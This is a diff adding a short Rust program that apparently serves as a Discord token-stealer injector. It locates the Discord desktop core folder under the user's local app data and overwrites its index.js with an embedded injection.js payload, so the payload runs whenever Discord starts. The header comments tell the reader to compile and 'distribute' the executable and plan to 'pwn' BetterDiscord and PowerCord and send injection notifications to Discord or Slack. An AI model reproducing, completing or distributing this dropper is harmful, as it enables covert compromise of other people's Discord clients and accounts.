@@ -1,0 +1,67 @@
+/*
+    Injector in rust, pretty shitty since it was made within an hour but it works.
+    Expect updates to this later after i figure out how to do this faster and more efficient.
+
+    TODO:
+        - Automatically restart discord and check all running discord processes
+        - Pwn BetterDiscord and PowerCord
+        - Injection notification to discord and/or slack
+
+    Compiling:
+        - Install rust from https://rustup.rs.
+        - Download this file.
+        - Open CMD in the folder where you've downloaded this file.
+        - Run `rustc -C debuginfo=0 -C opt-level=s -C strip=symbols .\injector-win.rs`
+            - You can add `-o name` in the arguments so the executable name will be different.
+        - Distribute the built executable
+
+    - Made by @autistheretard:matrix.org / t.me/autist69420
+*/
+
+use std::env;
+use std::path::Path;
+
+fn main() {
+    let localappdata = env::var("localappdata").unwrap();
+    let mut discord_path = String::new();
+    discord_path.push_str(localappdata.as_str());
+    discord_path.push_str("\\");
+    discord_path.push_str((format!("Discord\\app-{CURRENT_DISCORD_VERSION}\\modules\\discord_desktop_core-2\\discord_desktop_core")).as_str());
+
+    let path = Path::new(discord_path.as_str());
+    let mut file = String::new();
+    file.push_str(path.to_str().unwrap());
+    file.push_str("\\core.asar");
+
+    if check_for_file(file.as_str()) {
+        let drop_contents = include_str!("../../injection/injection.js");
+        let mut file_to_overwrite = String::new();
+        file_to_overwrite.push_str(path.to_str().unwrap());
+        file_to_overwrite.push_str("\\index.js");
+
+        if check_for_file(file_to_overwrite.as_str()) {
+            replace_file_contents(file_to_overwrite.as_str(), drop_contents);
+        } else {
+            std::fs::write(file_to_overwrite, drop_contents).unwrap();
+        }
+    }
+}
+
+
+fn check_for_file(file: &str) -> bool {
+    if Path::new(file).exists() {
+        return true;
+    }
+    false
+}
+
+fn replace_file_contents(file: &str, contents: &str) -> bool {
+    if check_for_file(file) {
+        let path = Path::new(file);
+        return std::fs::write(path, contents).is_ok();
+    }
+
+    false
+}
+
+static CURRENT_DISCORD_VERSION: &str = "1.0.9004";
